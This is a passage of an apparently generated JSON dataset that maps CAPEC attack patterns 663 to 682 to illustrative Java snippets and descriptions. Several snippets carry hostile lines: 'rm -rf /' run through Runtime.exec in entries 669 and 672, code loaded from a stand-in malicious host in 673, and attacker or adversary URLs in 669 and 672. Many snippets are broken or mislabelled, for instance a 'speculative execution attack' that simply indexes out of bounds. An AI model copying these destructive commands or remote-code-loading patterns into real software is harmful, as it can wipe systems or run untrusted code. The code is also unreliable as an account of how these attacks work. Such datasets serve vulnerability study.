        "description": "This Java code snippet demonstrates the CAPEC of exploiting security vulnerabilities or inherent functionalities of a web browser to manipulate traffic between two endpoints. It relates to CWEs 300, 494, 602, 368, and 506. The code downloads and executes arbitrary code from a remote location without verifying its origin or integrity, allowing an attacker to inject malicious code. The use of AccessController.doPrivileged() allows the downloaded code to bypass security restrictions, and the execution of the code using Runtime.getRuntime().exec() enables the malicious code to access the system. This code snippet embodies the main idea of the CAPEC, highlighting the risks of unverified code execution and the importance of secure coding practices."
    },
    {
        "capec_id": "663",
        "code_snippet": "public class SpeculativeExecutionAttack {\n    public static void main(String[] args) {\n        int array1[] = new int[2];\n        int array2[] = new int[2];\n        int temp = 0;\n        if (temp < array1.length) {\n            // Speculative execution: accessing array2 out of bounds\n            temp = array2[10];\n        }\n        // Gadgets to construct covert channel and access secret data\n        int x = 0;\n        int y = 0;\n        if (temp == 0) {\n            x = array1[0];\n        } else {\n            y = array2[0];\n        }\n        // Microarchitectural state after transient execution\n        int z = x + y;\n        System.out.println(\"Result: \" + z);\n    }\n}",
        "description": "This Java code snippet demonstrates a speculative execution attack, which is a type of transient execution attack. The code accesses an array out of bounds, which can lead to speculative execution and potentially expose sensitive data over a covert channel. The gadgets in the code construct a covert channel to access secret data, and the microarchitectural state after transient execution is not properly cleared, allowing the attack to succeed."
    },
    {
        "capec_id": "664",
        "code_snippet": "import java.io.IOException;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class SSRFVulnerable {\n    public static void makeRequest(String url) throws IOException {\n        URL requestUrl = new URL(url);\n        URLConnection connection = requestUrl.openConnection();\n        connection.connect();\n        // Read the response\n    }\n\n    public static void main(String[] args) throws IOException {\n        String userInput = \"http://example.com\";\n        makeRequest(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The 'makeRequest' method takes a URL as input and makes a request to that URL without validating the input. In the 'main' method, the 'userInput' variable is not validated, allowing an attacker to provide a malicious URL that the server will request, potentially leading to unauthorized access to internal networks or external services."
    },
    {
        "capec_id": "665",
        "code_snippet": "public class ThunderboltExploit {\n    public static void main(String[] args) throws Exception {\n        // CWE-345: Insufficient Verification of Data Authenticity\n        byte[] firmwareData = readFirmwareDataFromExternalDevice();\n        // No verification of firmware data authenticity\n        writeFirmwareDataToSPIFlash(firmwareData);\n\n        // CWE-353: Missing Support for Integrity Check\n        byte[] transmittedData = transmitDataOverThunderboltProtocol();\n        // No integrity check on transmitted data\n        processReceivedData(transmittedData);\n\n        // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n        boolean isAuthenticated = authenticateUsingAlternateChannel();\n        if (isAuthenticated) {\n            // Grant access to sensitive resources\n            accessSensitiveResources();\n        }\n\n        // CWE-1188: Initialization of a Resource with an Insecure Default\n        Resource resource = new Resource();\n        resource.setDefaultConfiguration(new InsecureDefaultConfiguration());\n\n        // CWE-862: Missing Authorization\n        accessResourceWithoutAuthorization(resource);\n    }\n\n    private static byte[] readFirmwareDataFromExternalDevice() {\n        // Read firmware data from external device\n        return new byte[0];\n    }\n\n    private static void writeFirmwareDataToSPIFlash(byte[] firmwareData) {\n        // Write firmware data to SPI flash\n    }\n\n    private static byte[] transmitDataOverThunderboltProtocol() {\n        // Transmit data over Thunderbolt protocol\n        return new byte[0];\n    }\n\n    private static void processReceivedData(byte[] receivedData) {\n        // Process received data\n    }\n\n    private static boolean authenticateUsingAlternateChannel() {\n        // Authenticate using alternate channel\n        return true;\n    }\n\n    private static void accessSensitiveResources() {\n        // Access sensitive resources\n    }\n\n    private static void accessResourceWithoutAuthorization(Resource resource) {\n        // Access resource without authorization\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable implementation of the Thunderbolt protocol, exploiting weaknesses in firmware verification, authentication, and authorization. It includes CWE-345: Insufficient Verification of Data Authenticity, CWE-353: Missing Support for Integrity Check, CWE-288: Authentication Bypass Using an Alternate Path or Channel, CWE-1188: Initialization of a Resource with an Insecure Default, and CWE-862: Missing Authorization."
    },
    {
        "capec_id": "666",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.UUID;\n\nimport javax.bluetooth.DataElement;\nimport javax.bluetooth.DeviceClass;\nimport javax.bluetooth.DiscoveryAgent;\nimport javax.bluetooth.DiscoveryListener;\nimport javax.bluetooth.LocalDevice;\nimport javax.bluetooth.ServiceRecord;\nimport javax.bluetooth.UUIDHelper;\nimport javax.microedition.io.Connector;\nimport javax.microedition.io.StreamConnection;\n\npublic class BluetoothFloodingAttack {\n    public static void main(String[] args) throws IOException {\n        LocalDevice localDevice = LocalDevice.getLocalDevice();\n        localDevice.setDiscoverable(DiscoveryAgent.GIAC);\n\n        StreamConnection streamConnection = (StreamConnection) Connector.open(\"btspp://localhost:\" + localDevice.getBluetoothAddress() + \";name=SampleServer\";\n        OutputStream outputStream = streamConnection.openOutputStream();\n        InputStream inputStream = streamConnection.openInputStream();\n\n        // CWE-246: Direct Use of Sockets\n        outputStream.write(\"SampleData\".getBytes());\n        outputStream.flush();\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"password=123456\";\n        outputStream.write(sensitiveData.getBytes());\n        outputStream.flush();\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        byte[] capturedData = new byte[1024];\n        inputStream.read(capturedData);\n        outputStream.write(capturedData);\n        outputStream.flush();\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        String message = \"SampleMessage\";\n        outputStream.write(message.getBytes());\n        outputStream.flush();\n\n        // CWE-404: Improper Resource Shutdown or Release\n        // Not releasing the resources properly\n        // outputStream.close();\n        // inputStream.close();\n        // streamConnection.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Bluetooth flooding attack, which is a type of DoS attack. It uses the L2CAP protocol to transfer large packets to Bluetooth-enabled devices. The code also incorporates several CWEs, including CWE-246 (direct use of sockets), CWE-319 (cleartext transmission of sensitive information), CWE-294 (authentication bypass by capture-replay), CWE-924 (improper enforcement of message integrity during transmission), and CWE-404 (improper resource shutdown or release)."
    },
    {
        "capec_id": "667",
        "code_snippet": "import java.util.UUID;\nimport android.bluetooth.BluetoothAdapter;\nimport android.bluetooth.BluetoothDevice;\nimport android.bluetooth.BluetoothSocket;\nimport android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\n\npublic class BluetoothAuthenticationBypass {\n    private BluetoothAdapter bluetoothAdapter;\n    private Context context;\n\n    public BluetoothAuthenticationBypass(Context context) {\n        this.context = context;\n        this.bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();\n    }\n\n    public void connectToDevice(String targetDeviceAddress) {\n        BluetoothDevice targetDevice = bluetoothAdapter.getRemoteDevice(targetDeviceAddress);\n        BluetoothSocket socket = targetDevice.createInsecureRfcommSocketToServiceRecord(UUID.fromString(\"00001101-0000-1000-8000-00805f9b34fb\"));\n        socket.connect();\n\n        // CWE-290: Authentication Bypass by Spoofing\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        // CWE-1390: Weak Authentication\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        Intent intent = new Intent(\"android.bluetooth.device.action.UUID\");\n        intent.putExtra(\"android.bluetooth.device.extra.DEVICE\", targetDevice);\n        context.sendBroadcast(intent);\n    }\n\n    public void receiveBroadcast() {\n        BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {\n            @Override\n            public void onReceive(Context context, Intent intent) {\n                // No verification of the intent source\n                String action = intent.getAction();\n                if (action.equals(\"android.bluetooth.device.action.UUID\")) {\n                    BluetoothDevice device = intent.getParcelableExtra(\"android.bluetooth.device.extra.DEVICE\");\n                    // Perform malicious actions on the target device\n                    // ...\n                }\n            }\n        };\n        IntentFilter intentFilter = new IntentFilter(\"android.bluetooth.device.action.UUID\");\n        context.registerReceiver(broadcastReceiver, intentFilter);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable Bluetooth authentication mechanism that is susceptible to MAC address spoofing attacks. The code connects to a target Bluetooth device using an insecure RFcomm socket and sends a broadcast intent to the device without verifying the source of the communication channel. The broadcast receiver does not properly verify the intent source, allowing an adversary to perform malicious actions on the target device."
    },
    {
        "capec_id": "668",
        "code_snippet": "import java.util.Random;\nimport javax.bluetooth.*;\nimport java.io.*;\n\npublic class BluetoothVulnerability {\n    public static void main(String[] args) throws IOException {\n        // CWE-285: Improper Authorization\n        // No authorization check is performed before allowing the connection\n        StreamConnectionNotifier notifier = (StreamConnectionNotifier) Connector.open(\"btspp://localhost:001122334455;name=MyDevice;authenticate=false;encrypt=false\");\n        StreamConnection connection = notifier.acceptAndOpen();\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n        // A weaker encryption algorithm is selected\n        int encryptionMode = 0x01; // Select a weaker encryption mode\n        connection.setEncryptionMode(encryptionMode);\n\n        // CWE-693: Protection Mechanism Failure\n        // No protection mechanism is used to prevent tampering with the entropy bits\n        byte[] entropyBits = new byte[16];\n        Random random = new Random();\n        random.nextBytes(entropyBits);\n        connection.send(entropyBits);\n\n        // CWE-425: Direct Request ('Forced Browsing')\n        // No access control is enforced on the received data\n        byte[] receivedData = new byte[1024];\n        int bytesRead = connection.receive(receivedData);\n        System.out.println(new String(receivedData, 0, bytesRead));\n\n        // CWE-1300: Improper Protection of Physical Side Channels\n        // No protection mechanism is used to prevent physical side channels\n        // In this example, the device's power consumption pattern is not protected\n        while (true) {\n            // Perform some power-consuming operation\n            Math.pow(2, 1024);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Bluetooth vulnerability that allows an adversary to decrypt information sent between two devices. The code lacks proper authorization, uses a weaker encryption algorithm, fails to protect the entropy bits, and does not enforce access control on received data. Additionally, it does not protect against physical side channels."
    },
    {
        "capec_id": "669",
        "code_snippet": "public class FirmwareUpdater {\n    private String firmwareVersion = \"1.0\";\n    private String updateServerUrl = \"http://update.example.com\";\n    private String maliciousCode = \"java.lang.Runtime.getRuntime().exec('rm -rf /');\";\n\n    public void updateFirmware() {\n        // CWE-1277: No mechanism to update firmware\n        if (firmwareVersion.equals(\"1.0\")) {\n            // CWE-506: Embedded malicious code\n            try {\n                Runtime.getRuntime().exec(maliciousCode);\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n\n        // CWE-527: Exposure of version-control repository\n        String repoUrl = \"http://git.example.com/repo.git\";\n        Git git = new Git(repoUrl);\n        git.pull();\n\n        // CWE-807: Reliance on untrusted inputs\n        String userInput = \"http://attacker.example.com/maliciousUpdate\";\n        updateServerUrl = userInput;\n\n        // CWE-1329: Reliance on component that is not updateable\n        OldComponent oldComponent = new OldComponent();\n        oldComponent.doSomething();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable firmware update mechanism that allows an adversary to insert malware into the update content. The code has multiple vulnerabilities, including the inability to update firmware (CWE-1277), embedded malicious code (CWE-506), exposure of a version-control repository (CWE-527), reliance on untrusted inputs (CWE-807), and reliance on a component that cannot be updated (CWE-1329)."
    },
    {
        "capec_id": "670",
        "code_snippet": "import java.lang.reflect.Field;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class MaliciousCompiler {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"System.out.println(\\\"Malicious code executed!\\\")\";\n        try {\n            Class<?> clazz = Class.forName(\"java.lang.Runtime\");\n            Field field = clazz.getDeclaredField(\"exit\");\n            field.setAccessible(true);\n            field.set(null, new Object() {\n                public void exit(int status) {\n                    // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n                    System.out.println(\"System exit status: \" + status);\n                    // CWE-913: Improper Control of Dynamically-Managed Code Resources\n                    List<String> sensitiveInfo = new ArrayList<>();\n                    sensitiveInfo.add(\"System properties: \" + System.getProperties());\n                    sensitiveInfo.add(\"Environment variables: \" + System.getenv());\n                    System.out.println(sensitiveInfo);\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        int secureFlag = 1;\n        if (secureFlag == 1) {\n            // Secure code\n            System.out.println(\"Secure code executed!\");\n        } else {\n            // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n            System.out.println(\"Insecure code executed!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary modifying development tools to inject malicious code. The code includes CWE-506 embedded malicious code, CWE-497 exposure of sensitive system information, CWE-913 improper control of dynamically-managed code resources, CWE-733 compiler optimization removal of security-critical code, and CWE-1037 processor optimization removal of security-critical code."
    },
    {
        "capec_id": "671",
        "code_snippet": "public class ASICDesign { \n\tprivate String securityToken; \n\tprivate String securityIdentifier; \n\tprivate boolean isAuthorized; \n\t\n\tpublic ASICDesign(String securityToken, String securityIdentifier) { \n\t\tthis.securityToken = securityToken; \n\t\tthis.securityIdentifier = securityIdentifier; \n\t\tthis.isAuthorized = false; \n\t} \n\t\n\tpublic void generateSecurityToken() { \n\t\t// CWE-1270: Generation of Incorrect Security Tokens \n\t\tthis.securityToken = \"\" + System.currentTimeMillis(); \n\t} \n\t\n\tpublic void setSecurityIdentifier(String identifier) { \n\t\t// CWE-1294: Insecure Security Identifier Mechanism \n\t\tthis.securityIdentifier = identifier; \n\t} \n\t\n\tpublic boolean authorizeTransaction(String token, String identifier) { \n\t\t// CWE-1259: Improper Restriction of Security Token Assignment \n\t\tif (token.equals(this.securityToken) && identifier.equals(this.securityIdentifier)) { \n\t\t\tthis.isAuthorized = true; \n\t\t} else { \n\t\t\tthis.isAuthorized = false; \n\t\t} \n\t\treturn this.isAuthorized; \n\t} \n\t\n\t// CWE-1263: Improper Physical Access Control \n\tprivate void restrictAccess() { \n\t\t// No physical access control implemented \n\t} \n\t\n\t// CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors \n\tprivate void protectConfidentialInfo() { \n\t\t// No protection implemented for confidential information \n\t} \n}",
        "description": "This Java code snippet demonstrates the CAPEC of maliciously altering requirements for an Application-Specific Integrated Circuit (ASIC) design, leading to potential security vulnerabilities. The code includes CWEs such as improper restriction of security token assignment, insecure security identifier mechanism, generation of incorrect security tokens, improper physical access control, and unprotected confidential information on the device. The code intentionally lacks proper security measures to illustrate these vulnerabilities."
    },
    {
        "capec_id": "672",
        "code_snippet": "public class MaliciousChipController {\n    private static final String REMOTE_CONTROL_URL = \"http://adversary.com/malicious_commands\";\n    private static final int SENSITIVE_REGISTER_ADDRESS = 0x12345678;\n    private static final int SECURITY_TOKEN_VALUE = 0xabcdef;\n\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        try {\n            Runtime.getRuntime().exec(\"rm -rf /\"); // malicious command\n        } catch (IOException e) {\n            // handle exception\n        }\n\n        // CWE-509: Replicating Malicious Code (Virus or Worm)\n        try {\n            Socket socket = new Socket(\"target_system\", 8080);\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(\"malicious_code_here\".getBytes());\n        } catch (IOException e) {\n            // handle exception\n        }\n\n        // CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State\n        try {\n            // access sensitive register\n            int sensitiveData = readRegister(SENSITIVE_REGISTER_ADDRESS);\n            // send sensitive data over covert channel\n            sendSensitiveDataOverCovertChannel(sensitiveData);\n        } catch (Exception e) {\n            // handle exception\n        }\n\n        // CWE-1262: Improper Access Control for Register Interface\n        try {\n            // access register without proper access control\n            writeRegister(SENSITIVE_REGISTER_ADDRESS, SECURITY_TOKEN_VALUE);\n        } catch (Exception e) {\n            // handle exception\n        }\n\n        // CWE-1259: Improper Restriction of Security Token Assignment\n        try {\n            // assign security token without proper restriction\n            assignSecurityToken(SECURITY_TOKEN_VALUE);\n        } catch (Exception e) {\n            // handle exception\n        }\n    }\n\n    private static int readRegister(int address) {\n        // implementation of reading register\n        return 0;\n    }\n\n    private static void writeRegister(int address, int value) {\n        // implementation of writing register\n    }\n\n    private static void sendSensitiveDataOverCovertChannel(int sensitiveData) {\n        // implementation of sending sensitive data over covert channel\n    }\n\n    private static void assignSecurityToken(int tokenValue) {\n        // implementation of assigning security token\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious chip controller that embodies the main idea of the CAPEC. It includes embedded malicious code, replicating malicious code, exposure of sensitive information, improper access control for register interface, and improper restriction of security token assignment."
    },
    {
        "capec_id": "673",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousCodeInjector {\n    public static void main(String[] args) throws Exception {\n        // CWE-494: Download of Code Without Integrity Check\n        URL url = new URL(\"http://malicious-website.com/malicious-code.jar\");\n        URLClassLoader loader = new URLClassLoader(new URL[] { url });\n        Class<?> maliciousClass = loader.loadClass(\"MaliciousCode\");\n        Object maliciousObject = maliciousClass.newInstance();\n\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"public class MaliciousCode { public static void main(String[] args) { System.out.println(\"Malicious code executed\"); } }\";\n        File maliciousFile = new File(\"MaliciousCode.java\");\n        if (!maliciousFile.exists()) {\n            maliciousFile.createNewFile();\n        }\n        FileWriter writer = new FileWriter(maliciousFile);\n        writer.write(maliciousCode);\n        writer.close();\n\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        Process process = Runtime.getRuntime().exec(\"git add . && git commit -m \\\"Malicious code injected\\\" && git push\");\n        process.waitFor();\n\n        // CWE-507: Trojan Horse\n        System.out.println(\"Benign functionality: Calculating the sum of 2 + 2\");\n        int sum = 2 + 2;\n        System.out.println(\"Sum: \" + sum);\n\n        // CWE-215: Insertion of Sensitive Information Into Debugging Code\n        System.out.println(\"Debugging information: username = admin, password = password123\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC, where a malicious actor injects malicious code into a legitimate software development process. The code downloads malicious code from a remote location without integrity checks (CWE-494), embeds it into the software (CWE-506), and exposes the version-control repository to unauthorized access (CWE-527). The software appears to contain benign functionality (CWE-507), but also contains hidden malicious code. Additionally, sensitive information is inserted into debugging code (CWE-215)."
    },
    {
        "capec_id": "674",
        "code_snippet": "public class FPGAExploit {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        byte[] maliciousCode = new byte[] { 0x01, 0x02, 0x03, 0x04 }; // Malicious function to impact system operation\n        \n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        // Disable security-critical protection mechanism\n        System.setProperty(\"java.security.egd\", \"file:///dev/./urandom\");\n        \n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        // Simulate error injection to degrade hardware redundancy\n        try {\n            throw new Exception(\"Simulated error injection\");\n        } catch (Exception e) {\n            // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n            // Ignore voltage and clock glitches\n            System.out.println(\"Ignoring voltage and clock glitches...\");\n        }\n        \n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        // Disable compiler optimization for security-critical code\n        System.setProperty(\"java.compiler\", \"NONE\");\n        \n        // Reload FPGA configuration memory chip with malicious code\n        FPGAConfigurator configurator = new FPGAConfigurator();\n        configurator.reloadConfiguration(maliciousCode);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of altering FPGA functionality by reloading the configuration memory chip with malicious code. It incorporates CWEs 1037, 506, 1334, 733, and 1247 to showcase the vulnerabilities."
    },
    {
        "capec_id": "675",
        "code_snippet": "public class DecommissionedDevice {\n    private byte[] sensitiveData;\n    private boolean isDecommissioned;\n\n    public DecommissionedDevice(byte[] sensitiveData) {\n        this.sensitiveData = sensitiveData;\n    }\n\n    public void decommission() {\n        isDecommissioned = true;\n        // CWE-1266: No scrubbing capability to remove sensitive data\n        // CWE-1301: Incomplete data removal within hardware component\n        // CWE-672: Operation on a resource after expiration or release\n        // CWE-226: Sensitive information not removed before reuse\n        // CWE-316: Cleartext storage of sensitive information in memory\n        // No secure erase or overwrite of sensitiveData\n    }\n\n    public void reuseDevice() {\n        if (isDecommissioned) {\n            // CWE-226: Reusing device without clearing sensitive information\n            // CWE-316: Sensitive information still in cleartext in memory\n            System.out.println(\"Reusing device with sensitive data: \" + new String(sensitiveData));\n        }\n    }\n}\n",
        "description": "Java code snippet demonstrating the CAPEC of an adversary obtaining decommissioned devices with sensitive information due to improper scrubbing, incomplete data removal, and cleartext storage of sensitive information in memory."
    },
    {
        "capec_id": "676",
        "code_snippet": "public class NoSQLInjection {\n    public static void main(String[] args) {\n        String userInput = \"name='admin'\";\n        String query = \"SELECT * FROM users WHERE name='\" + userInput + \"'\";\n        NoSQLDatabase db = new NoSQLDatabase();\n        db.executeQuery(query);\n    }\n}\n\nclass NoSQLDatabase {\n    public void executeQuery(String query) {\n        // Assume this method executes the query on a NoSQL database\n        System.out.println(\"Executing query: \" + query);\n    }\n}",
        "description": "This Java code snippet demonstrates a NoSQL injection vulnerability. The 'userInput' variable is concatenated into a query string without proper sanitization, allowing an attacker to inject malicious input and modify the query's logic. This can lead to unauthorized data access, privilege escalation, or code execution."
    },
    {
        "capec_id": "677",
        "code_snippet": "public class MaliciousServerMotherboard {\n    private static final String MALICIOUS_CODE = \"<insert_malicious_code_here>\";\n    private static final String SENSITIVE_SYSTEM_INFO = \"<insert_sensitive_system_info_here>\";\n\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        executeMaliciousCode(MALICIOUS_CODE);\n\n        // CWE-509: Replicating Malicious Code (Virus or Worm)\n        replicateMaliciousCode(MALICIOUS_CODE);\n\n        // CWE-1262: Improper Access Control for Register Interface\n        accessRegistersWithoutPermission();\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        exposeSensitiveSystemInfo(SENSITIVE_SYSTEM_INFO);\n\n        // CWE-1323: Improper Management of Sensitive Trace Data\n        storeTraceDataInUnprotectedLocation();\n    }\n\n    private static void executeMaliciousCode(String code) {\n        // Insert malicious code execution logic here\n    }\n\n    private static void replicateMaliciousCode(String code) {\n        // Insert malicious code replication logic here\n    }\n\n    private static void accessRegistersWithoutPermission() {\n        // Insert register access logic without permission here\n    }\n\n    private static void exposeSensitiveSystemInfo(String info) {\n        // Insert sensitive system info exposure logic here\n    }\n\n    private static void storeTraceDataInUnprotectedLocation() {\n        // Insert trace data storage logic in unprotected location here\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of inserting malware in a server motherboard to alter server functionality. It includes CWE-506 embedded malicious code, CWE-509 replicating malicious code, CWE-1262 improper access control for register interface, CWE-497 exposure of sensitive system information, and CWE-1323 improper management of sensitive trace data."
    },
    {
        "capec_id": "678",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class BuildProcessMisconfiguration {\n    public static void main(String[] args) {\n        try {\n            // CWE-497: Exposure of Sensitive System Information\n            String systemInfo = System.getProperty(\"os.name\") + \": \" + System.getProperty(\"os.version\");\n            System.out.println(\"System Information: \" + systemInfo);\n\n            // CWE-377: Insecure Temporary File\n            File tempFile = File.createTempFile(\"build_config\", \".tmp\");\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Misconfigured build data\");\n            writer.close();\n\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            try {\n                // Simulate an error\n                int x = 5 / 0;\n            } catch (Exception e) {\n                System.out.println(\"Error: \" + e.getMessage() + \" - System Information: \" + systemInfo);\n            }\n\n            // CWE-913: Improper Control of Dynamically-Managed Code Resources\n            String dynamicCode = \"public class DynamicCode { public static void main(String[] args) { System.out.println(\\\"Dynamic code executed\\\"); } }\";\n            FileWriter dynamicCodeWriter = new FileWriter(\"DynamicCode.java\");\n            dynamicCodeWriter.write(dynamicCode);\n            dynamicCodeWriter.close();\n\n            // CWE-426: Untrusted Search Path\n            String searchPath = System.getProperty(\"java.library.path\") + \":/tmp/misconfigured_path\";\n            System.setProperty(\"java.library.path\", searchPath);\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of deliberately misconfiguring the system build process by altering build data. It includes vulnerabilities related to exposure of sensitive system information, insecure temporary files, error messages containing sensitive information, improper control of dynamically-managed code resources, and untrusted search paths."
    },
    {
        "capec_id": "679",
        "code_snippet": "public class VulnerableMemoryAccess {\n    public static void main(String[] args) {\n        // CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n        int[] writableRegion = new int[1024];\n        int[] protectedRegion = new int[1024];\n        // Same register lock control bit protects both regions\n        registerLockControlBit = 0x1;\n        // CWE-1252: CPU Hardware Not Configured to Support Exclusivity of Write and Execute Operations\n        // No hardware support for exclusivity of write and execute operations\n        // CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\n        int[] aliasedRegion = new int[1024];\n        // Inconsistent read/write permissions enforced by the hardware\n        aliasedRegion[0] = 0xdeadbeef;\n        // CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\n        int[] overlappingRegion = new int[512];\n        overlappingRegion[0] = 0xdeadbeef;\n        // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n        byte[] bootCode = new byte[1024];\n        // No access control or protections for volatile memory\n        bootCode[0] = 0x01;\n        // CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\n        int[] immutableData = new int[1024];\n        immutableData[0] = 0xdeadbeef;\n        // CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\n        int[] mirroredRegion = new int[1024];\n        mirroredRegion[0] = 0xdeadbeef;\n        // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n        int[] overlappingFabricRegion = new int[512];\n        overlappingFabricRegion[0] = 0xdeadbeef;\n        // CWE-1326: Missing Immutable Root of Trust in Hardware\n        // No immutable root of trust in the hardware\n        // Adversary can bypass secure boot or execute untrusted boot code\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary taking advantage of missing or incorrectly configured access control within memory to read/write data or inject malicious code into said memory. It incorporates multiple CWEs, including insufficient granularity of address regions protected by register locks, lack of hardware support for exclusivity of write and execute operations, improper access control applied to mirrored or aliased memory regions, and more. The code showcases vulnerable memory access and manipulation, highlighting the importance of proper memory protection and access control mechanisms."
    },
    {
        "capec_id": "680",
        "code_snippet": "public class VulnerableRegisterAccess {\n    private static final int LOCK_BIT = 0x01;\n    private static final int STICKY_BIT = 0x02;\n    private static final int REGISTER_ADDRESS = 0x1000;\n\n    public static void main(String[] args) {\n        // CWE-1224: Improper Restriction of Write-Once Bit Fields\n        setStickyBit(REGISTER_ADDRESS, STICKY_BIT);\n        setStickyBit(REGISTER_ADDRESS, ~STICKY_BIT);\n\n        // CWE-1231: Improper Prevention of Lock Bit Modification\n        setLockBit(REGISTER_ADDRESS, LOCK_BIT);\n        setLockBit(REGISTER_ADDRESS, ~LOCK_BIT);\n\n        // CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n        setRegisterValue(REGISTER_ADDRESS, 0xdeadbeef);\n\n        // CWE-1262: Improper Access Control for Register Interface\n        setRegisterValue(REGISTER_ADDRESS, 0xdeadbeef);\n\n        // CWE-1283: Mutable Attestation or Measurement Reporting Data\n        setAttestationData(REGISTER_ADDRESS, \"tampered_data\");\n    }\n\n    private static native void setStickyBit(int address, int value);\n    private static native void setLockBit(int address, int value);\n    private static native void setRegisterValue(int address, int value);\n    private static native void setAttestationData(int address, String data);\n}",
        "description": "Java code snippet demonstrating vulnerable register access, including improper restriction of write-once bit fields, lock bit modification, missing lock bit protection, improper access control for register interface, and mutable attestation or measurement reporting data."
    },
    {
        "capec_id": "681",
        "code_snippet": "public class SoCController {\n    private Map<String, String> securityTokens = new HashMap<>();\n\n    public SoCController() {\n        // CWE-1259: Improper Restriction of Security Token Assignment\n        securityTokens.put(\"admin\", \"123456\");\n        securityTokens.put(\"user\", \"abcdef\");\n    }\n\n    public void performAction(String entityId, String action) {\n        // CWE-1267: Policy Uses Obsolete Encoding\n        String encodedEntityId = entityId.replace(\"=\", \"-\");\n        String token = securityTokens.get(encodedEntityId);\n\n        if (token != null) {\n            // CWE-1270: Generation of Incorrect Security Tokens\n            if (token.equals(\"123456\")) {\n                // Allow admin actions\n                System.out.println(\"Performing admin action: \" + action);\n            } else if (token.equals(\"abcdef\")) {\n                // Allow user actions\n                System.out.println(\"Performing user action: \" + action);\n            } else {\n                // CWE-1294: Insecure Security Identifier Mechanism\n                System.out.println(\"Invalid security token: \" + token);\n            }\n        } else {\n            // CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n            System.out.println(\"No security token provided for entity: \" + entityId);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting missing or incorrectly configured security identifiers in a System-on-Chip (SoC) for access control. It includes CWEs 1259, 1267, 1270, 1294, and 1302, showcasing improper security token assignment, obsolete encoding, incorrect security token generation, insecure security identifier mechanisms, and missing source identifiers in entity transactions."
    },
    {
        "capec_id": "682",
        "code_snippet": "public class UnpatchableDevice {\n    private static final byte[] FIRMWARE = { /* hardcoded firmware */ };\n    private static final byte[] ROM_CODE = { /* hardcoded ROM code */ };\n\n    public void executeFirmware() {\n        // execute firmware without any validation or update checks\n        System.out.println(\"Executing firmware...\");\n        execute(FIRMWARE);\n    }\n\n    public void executeRomCode() {\n        // execute ROM code without any validation or update checks\n        System.out.println(\"Executing ROM code...\");\n        execute(ROM_CODE);\n    }\n\n    private void execute(byte[] code) {\n        // assume this method executes the given code\n        // without any error handling or redundancy checks\n    }\n}\n",
        "description": "This Java code snippet demonstrates an unpatchable device that executes hardcoded firmware and ROM code without any validation, update checks, or error handling, making it vulnerable to various attacks."
    },
